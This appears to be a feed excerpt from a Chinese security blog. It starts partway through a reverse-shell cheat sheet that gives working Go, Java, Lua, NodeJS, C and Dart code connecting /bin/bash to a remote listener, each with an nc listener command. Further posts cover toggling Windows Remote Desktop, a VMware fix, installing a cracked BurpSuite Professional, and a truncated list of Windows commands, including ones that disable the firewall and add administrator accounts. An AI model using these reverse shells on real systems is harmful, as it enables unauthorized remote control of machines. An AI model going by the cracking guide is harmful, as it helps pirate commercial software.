main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;&lt;ip&gt;:&lt;port&gt;&quot;);cmd:=exec.Command(&quot;/bin/bash&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27;</span> &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; <span class="built_in">rm</span> /tmp/t.go</span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;exec 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;;cat &lt;&amp;5 | while read line; do <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done&#x27;&quot;</span>).waitFor();</span><br><span class="line"></span><br><span class="line">Process p=new ProcessBuilder(<span class="string">&quot;/bin/bash&quot;</span>).redirectErrorStream(<span class="literal">true</span>).start();Socket s=new Socket(<span class="string">&quot;&lt;ip&gt;&quot;</span>,&lt;port&gt;);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;0)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;0)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.<span class="built_in">sleep</span>(50);try &#123;p.exitValue();<span class="built_in">break</span>;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;&lt;ip&gt;&#x27;,&#x27;&lt;port&gt;&#x27;);os.execute(&#x27;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">lua5.1 -e <span class="string">&#x27;local host, port = &quot;&lt;ip&gt;&quot;, &lt;port&gt; local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">    var net = require(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        <span class="built_in">cp</span> = require(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(&lt;port&gt;, <span class="string">&quot;&lt;ip&gt;&quot;</span>, <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">return</span> /a/;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">require(<span class="string">&#x27;child_process&#x27;</span>).<span class="built_in">exec</span>(<span class="string">&#x27;nc -e /bin/bash &lt;ip&gt; &lt;port&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">global.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).<span class="built_in">exec</span>(<span class="string">&#x27;nc &lt;ip&gt; &lt;port&gt; -e /bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;arpa/inet.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    struct sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    int sockt = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(&lt;port&gt;);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;&lt;ip&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span><br><span class="line">    sizeof(revsockaddr));</span><br><span class="line">    dup2(sockt, 0);</span><br><span class="line">    dup2(sockt, 1);</span><br><span class="line">    dup2(sockt, 2);</span><br><span class="line"></span><br><span class="line">    char * const argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, NULL&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, argv, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc /tmp/shell.c --output csh &amp;&amp; csh</span><br></pre></td></tr></table></figure><h2 id="C-1"><a href="#C-1" class="headerlink" title="C"></a>C</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">import <span class="string">&#x27;dart:io&#x27;</span>;</span><br><span class="line">import <span class="string">&#x27;dart:convert&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">  Socket.connect(<span class="string">&quot;&lt;ip&gt;&quot;</span>, &lt;port&gt;).<span class="keyword">then</span>((socket) &#123;</span><br><span class="line">    socket.listen((data) &#123;</span><br><span class="line">      Process.start(<span class="string">&#x27;/bin/bash&#x27;</span>, []).<span class="keyword">then</span>((Process process) &#123;</span><br><span class="line">        process.stdin.writeln(new String.fromCharCodes(data).trim());</span><br><span class="line">        process.stdout</span><br><span class="line">          .transform(utf8.decoder)</span><br><span class="line">          .listen((output) &#123; socket.write(output); &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    onDone: () &#123;</span><br><span class="line">      socket.destroy();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.csdn.net/qq_46717339/article/details/119650409#t23">https://blog.csdn.net/qq_46717339&#x2F;article&#x2F;details&#x2F;119650409#t23</a><br><a href="https://blkstone.github.io/2017/12/30/reverse-shell/">https://blkstone.github.io/2017/12/30/reverse-shell/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;&lt;h3 id=&quot;TCP&quot;&gt;&lt;a href=&quot;#TCP&quot; class=&quot;headerlink&quot; title=&quot;TCP&quot;&gt;&lt;/a&gt;TC</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CMD启动或关闭远程桌面</title>
    <link href="http://webb-l.top/2022/05/12/CMD%E5%90%AF%E5%8A%A8%E6%88%96%E5%85%B3%E9%97%AD%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <id>http://webb-l.top/2022/05/12/CMD%E5%90%AF%E5%8A%A8%E6%88%96%E5%85%B3%E9%97%AD%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</id>
    <published>2022-05-12T13:45:53.000Z</published>
    <updated>2022-05-12T13:51:36.223Z</updated>
    
    <content type="html"><![CDATA[<ul><li>启动或者关闭远程桌面需要<strong>管理员</strong>权限。</li></ul><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">:: 修改注册表</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line">:: 防火墙开放远程桌面</span><br><span class="line">netsh advfirewall firewall <span class="built_in">set</span> rule group=&quot;remote desktop&quot; new enable=Yes</span><br><span class="line"></span><br><span class="line">:: 查看是否启动成功</span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netstat</span> -<span class="title">anot</span> | <span class="title">findstr</span> &quot;3389&quot;</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:3389           0.0.0.0:0              <span class="title">LISTENING</span>       5900     <span class="title">InHost</span></span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    [::]:3389              [::]:0                 <span class="title">LISTENING</span>       5900     <span class="title">InHost</span></span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    0.0.0.0:3389           *:*                                    5900</span></span><br><span class="line"><span class="function">  <span class="title">UDP</span>    [::]:3389              *:*                                    5900</span></span><br></pre></td></tr></table></figure><h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:: 修改注册表</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"></span><br><span class="line">:: 防火墙开放远程桌面</span><br><span class="line">netsh advfirewall firewall <span class="built_in">set</span> rule group=&quot;remote desktop&quot; new enable=No</span><br><span class="line"></span><br><span class="line">:: 查看是否启动成功</span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netstat</span> -<span class="title">anot</span> | <span class="title">findstr</span> &quot;3389&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;启动或者关闭远程桌面需要&lt;strong&gt;管理员&lt;/strong&gt;权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;启动&quot;&gt;&lt;a href=&quot;#启动&quot; class=&quot;headerlink&quot; title=&quot;启动&quot;&gt;&lt;/a&gt;启动&lt;/h2&gt;&lt;figure class=&quot;hi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>OpenSUSE下的VMware Workstation启动虚拟机错误</title>
    <link href="http://webb-l.top/2022/05/09/OpenSUSE%E4%B8%8B%E7%9A%84VMware-Workstation%E5%90%AF%E5%8A%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%94%99%E8%AF%AF/"/>
    <id>http://webb-l.top/2022/05/09/OpenSUSE%E4%B8%8B%E7%9A%84VMware-Workstation%E5%90%AF%E5%8A%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%94%99%E8%AF%AF/</id>
    <published>2022-05-09T00:45:16.000Z</published>
    <updated>2022-05-10T15:59:36.035Z</updated>
    
    <content type="html"><![CDATA[<h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><p><strong>Could not open &#x2F;dev&#x2F;vmmon: ?????????.<br>Please make sure that the kernel module &#96;vmmon’ is loaded.</strong></p><p><img src="/../images/VMware-Workstation/2022-05-09_08-46-24.png" alt="2022-05-09_08-46-24.png"></p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul><li><p>安装完成VMware Workstation是可以正常使用，重启VMware Workstation就出现该问题。</p></li><li><p>这是因为没有启动vmware的服务。</p></li></ul><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">webb@localhost:~&gt; sudo /etc/init.d/vmware start </span><br><span class="line">[sudo] root 的密码：</span><br><span class="line">Starting VMware services:</span><br><span class="line">   Virtual machine monitor                                             <span class="keyword">done</span></span><br><span class="line">   Virtual machine communication interface                             <span class="keyword">done</span></span><br><span class="line">   VM communication interface socket family                            <span class="keyword">done</span></span><br><span class="line">   Virtual ethernet                                                    <span class="keyword">done</span></span><br><span class="line">   VMware Authentication Daemon                                        <span class="keyword">done</span></span><br><span class="line">   Shared Memory Available    </span><br></pre></td></tr></table></figure><ul><li>问题解决</li></ul><p><img src="/../images/VMware-Workstation/2022-05-09_08-57-45.png" alt="2022-05-09_08-57-45.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;错误信息&quot;&gt;&lt;a href=&quot;#错误信息&quot; class=&quot;headerlink&quot; title=&quot;错误信息&quot;&gt;&lt;/a&gt;错误信息&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Could not open &amp;#x2F;dev&amp;#x2F;vmmon: ?????????.&lt;br&gt;Ple</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Kali Linux安装BurpSuite破解版</title>
    <link href="http://webb-l.top/2022/04/30/Kali-Linux%E5%AE%89%E8%A3%85BurpSuite%E7%A0%B4%E8%A7%A3%E7%89%88/"/>
    <id>http://webb-l.top/2022/04/30/Kali-Linux%E5%AE%89%E8%A3%85BurpSuite%E7%A0%B4%E8%A7%A3%E7%89%88/</id>
    <published>2022-04-30T15:42:53.000Z</published>
    <updated>2022-04-30T16:29:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="解压BurpSuite破解版。"><a href="#解压BurpSuite破解版。" class="headerlink" title="解压BurpSuite破解版。"></a>解压BurpSuite破解版。</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ unzip BurpSuite\ v2022.3.6专业破解版.zip </span><br><span class="line">Archive:  BurpSuite v2022.3.6专业破解版.zip</span><br><span class="line">  inflating: BurpCrack.jar           </span><br><span class="line">  inflating: BurpSuite.ico           </span><br><span class="line">  inflating: burpsuite_pro_v2022.3.6.jar  </span><br><span class="line">  inflating: BurpSuiteLoader.bat     </span><br><span class="line">  inflating: BurpSuiteLoader.sh      </span><br><span class="line">  inflating: BurpSuiteLoader.vbs     </span><br><span class="line">  inflating: BurpSuiteLoader_v2022.3.6.jar  </span><br><span class="line">  inflating: 创建桌面快捷方式.bat  </span><br><span class="line"> extracting: 建议：JAVA15环境运行.txt  </span><br><span class="line">  inflating: 微信公众号雾晓安全.jpg  </span><br><span class="line">  inflating: 想获取更多安全资源.html  </span><br><span class="line">  inflating: 最新BurpSuite汉化破解版说明.pdf  </span><br><span class="line">  inflating: 网络安全攻防Clud.jpg  </span><br><span class="line">  inflating: 网络安全攻防WiKi.jpg  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装和破解"><a href="#安装和破解" class="headerlink" title="安装和破解"></a>安装和破解</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li>因为Kali Linux默认安装了BurpSuite，我们就不需要再次安装了。</li><li>如果没有安装就运行<code>sudo apt install burpsuite</code>命令进行安装。</li></ul><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><ul><li><p>查询BurpSuite的安装位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ whereis burpsuite                                                                </span><br><span class="line">burpsuite: /usr/bin/burpsuite /usr/share/burpsuite</span><br></pre></td></tr></table></figure></li><li><p>查看上面两条记录的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ ll /usr/bin/burpsuite</span><br><span class="line">-rwxr-xr-x 1 root root 184 12月 13 23:50 /usr/bin/burpsuite</span><br><span class="line">                                                                                            </span><br><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ ll /usr/share/burpsuite</span><br><span class="line">总用量 193304</span><br><span class="line">-rw-r--r-- 1 root root 197937091 12月 13 23:50 burpsuite.jar</span><br></pre></td></tr></table></figure></li><li><p>查看第一个文件信息。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ <span class="built_in">cat</span> /usr/bin/burpsuite </span><br><span class="line"><span class="comment">#!/usr/bin/env sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JAVA_CMD=java</span><br><span class="line"></span><br><span class="line"><span class="comment"># Include the wrappers utility script</span></span><br><span class="line">. /usr/lib/java-wrappers/java-wrappers.sh</span><br><span class="line"></span><br><span class="line">run_java -jar /usr/share/burpsuite/burpsuite.jar <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure><ul><li>修改<code>BurpSuiteLoader.sh</code>的权限。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ <span class="built_in">chmod</span> +x BurpSuiteLoader.sh </span><br></pre></td></tr></table></figure><ul><li>将我们破解文件移动到<code>/usr/share/burpsuite</code>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ sudo <span class="built_in">mv</span> * /usr/share/burpsuite/</span><br></pre></td></tr></table></figure><ul><li>修改<code>/usr/bin/burpsuite</code>文件的内容。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ sudo vim /usr/bin/burpsuite</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /usr/share/burpsuite/</span><br><span class="line"></span><br><span class="line">./BurpSuiteLoader.sh</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/temp]</span><br><span class="line">└─$ burpsuite</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br><span class="line">Your JRE appears to be version 11.0.14.1 from Debian</span><br><span class="line">Burp has not been fully tested on this platform and you may experience problems.</span><br><span class="line">    ____                      _____       _ __          __    ____            __         </span><br><span class="line">   / __ )__  ___________     / ___/__  __(_) /____     / /   / __ \____ _____/ /__  _____</span><br><span class="line">  / __  / / / / ___/ __ \    \__ \/ / / / / __/ _ \   / /   / / / / __ `/ __  / _ \/ ___/</span><br><span class="line"> / /_/ / /_/ / /  / /_/ /   ___/ / /_/ / / /_/  __/  / /___/ /_/ / /_/ / /_/ /  __/ /    </span><br><span class="line">/_____/\__,_/_/  / .___/   /____/\__,_/_/\__/\___/  /_____/\____/\__,_/\__,_/\___/_/     </span><br><span class="line">                /_/                                                                      </span><br><span class="line">Github:https://github.com/x-Ai/BurpSuiteLoader 商业使用请购买正版软件！</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;解压BurpSuite破解版。&quot;&gt;&lt;a href=&quot;#解压BurpSuite破解版。&quot; class=&quot;headerlink&quot; title=&quot;解压BurpSuite破解版。&quot;&gt;&lt;/a&gt;解压BurpSuite破解版。&lt;/h2&gt;&lt;figure class=&quot;highli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows 常见命令备忘清单</title>
    <link href="http://webb-l.top/2022/04/25/Windows-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E6%B8%85%E5%8D%95/"/>
    <id>http://webb-l.top/2022/04/25/Windows-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E6%B8%85%E5%8D%95/</id>
    <published>2022-04-25T08:20:50.000Z</published>
    <updated>2022-05-23T02:33:23.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>netsh advfirewall show allprofiles</td><td>防火墙状态</td></tr><tr><td>netsh firewall show opmode</td><td>防火墙状态</td></tr><tr><td>netsh firewall show state</td><td>防火墙状态</td></tr><tr><td>netsh advfirewall firewall show rule name&#x3D;all</td><td>防火墙所有规则</td></tr><tr><td>netsh advfirewall firewall show rule name&#x3D;http</td><td>防火墙某个规则</td></tr><tr><td>netsh firewall show config</td><td>防火墙配置</td></tr><tr><td>netsh firewall set opmode mode &#x3D; disable</td><td>关闭防火墙</td></tr><tr><td>netsh advfirewall set allprofiles state off</td><td>关闭防火墙</td></tr><tr><td>netsh firewall set opmode mode &#x3D; enable</td><td>启动防火墙</td></tr><tr><td>netsh advfirewall set allprofiles state on</td><td>启动防火墙</td></tr><tr><td>netsh firewall set portopening tcp 80 enable</td><td>添加某个端口</td></tr><tr><td>netsh advfirewall firewall add rule name&#x3D;”http” dir&#x3D;in protocol&#x3D;tcp localport&#x3D;80 action&#x3D;allow</td><td>添加某个端口</td></tr><tr><td>netsh firewall delete portopening protocol&#x3D;TCP port&#x3D;80</td><td>删除某个端口</td></tr><tr><td>netsh advfirewall firewall delete rule name&#x3D;http protocol&#x3D;tcp localport&#x3D;80</td><td>删除某个端口</td></tr><tr><td>netsh firewall show logging</td><td>防火墙日志</td></tr><tr><td>netsh firewall reset</td><td>恢复默认配置</td></tr></tbody></table><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>net user</td><td>查询所有用户 （本机）</td></tr><tr><td>net user &#x2F;domain</td><td>查询所有用户 （域控）</td></tr><tr><td>whoami &#x2F;all</td><td>查询所有用户 （本机）</td></tr><tr><td>wmic useraccount get &#x2F;ALL &#x2F;format:csv</td><td>查询所有用户 （本机）</td></tr><tr><td>whoami</td><td>查询当前用户</td></tr><tr><td>whoami &#x2F;logonid</td><td>查询当前用户登录ID</td></tr><tr><td>whoami &#x2F;priv</td><td>查询当前用户特权信息</td></tr><tr><td>whoami &#x2F;groups</td><td>查询当前用户的组</td></tr><tr><td>net localgroup administrators</td><td>查询某个组的成员</td></tr><tr><td>quser user</td><td>所有当前在线用户</td></tr><tr><td>quser user &lt;用户名&gt;</td><td>当前某个在线用户</td></tr><tr><td>qwinsta</td><td>所有当前在线用户</td></tr><tr><td>qwinsta &lt;用户名&gt;</td><td>当前某个在线用户</td></tr><tr><td>query user</td><td>所有当前在线用户</td></tr><tr><td>query user &lt;用户名&gt;</td><td>当前某个在线用户</td></tr><tr><td>net user &lt;用户名&gt; &lt;密码&gt; &#x2F;add</td><td>添加用户</td></tr><tr><td>net user &lt;用户名&gt; *</td><td>修改某个用户密码</td></tr><tr><td>net user &lt;用户名&gt; &#x2F;del</td><td>删除用户</td></tr><tr><td>net localgroup administrators &lt;用户名&gt; &#x2F;add</td><td>将某位用户添加到管理员组</td></tr><tr><td>net localgroup administrators &lt;用户名&gt; &#x2F;delete</td><td>将某位用户从管理员组删除</td></tr></tbody></table><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>sc query state&#x3D; all</td><td>查看所有服务</td></tr><tr><td>net start</td><td>查看所有开启的服务</td></tr><tr><td>sc query</td><td>查看所有开启的服务</td></tr><tr><td>sc query state&#x3D; active</td><td>查看所有开启的服务</td></tr><tr><td>sc query state&#x3D; inactive</td><td>查看所有关闭的服务</td></tr><tr><td>sc query type&#x3D; driver</td><td>查看所有驱动的服务</td></tr><tr><td>sc query 